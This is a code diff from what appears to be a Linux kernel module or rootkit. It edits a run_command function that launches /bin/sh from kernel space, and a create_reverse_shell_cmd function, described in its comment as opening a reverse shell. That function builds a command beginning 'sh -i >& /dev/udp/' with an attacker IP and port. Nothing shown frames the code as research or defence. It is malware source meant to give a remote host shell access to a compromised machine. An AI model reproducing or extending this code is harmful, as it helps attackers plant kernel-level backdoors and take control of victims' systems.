@@ -339,7 +339,6 @@ static void free_argv(struct subprocess_info* info) {
  */
 int run_command(char* run_cmd) {
 	struct subprocess_info* info;
-	char* cmd_string;
 	static char* envp[] = {
 		"HOME=/",
 		"TERM=linux",
@@ -351,12 +350,6 @@ int run_command(char* run_cmd) {
 
 	if (!argv) {
 		goto out_of_mem;
-	}
-
-	cmd_string = kstrdup(run_cmd, GFP_KERNEL);
-
-	if (!cmd_string) {
-		goto free_argv;
 	}
 
 	argv[0] = "/bin/sh";
@@ -378,9 +371,9 @@ out_of_mem:
  *
  * This command is responsible for opening a reverse shell.
  */
-static char* create_reverse_shell_cmd(void) {
+char* create_reverse_shell_cmd(void) {
 	// Prepare to assemble string
-	char *beginning, *ending, *cmd;
+	char* beginning, *ending, *cmd;
 	int max_ip_port_len;
 	max_ip_port_len = 16 + 5 + 1; // 16 chars for IP, 5 for port, 1 for /
 	beginning = "echo 'sh -i >& /dev/udp/";
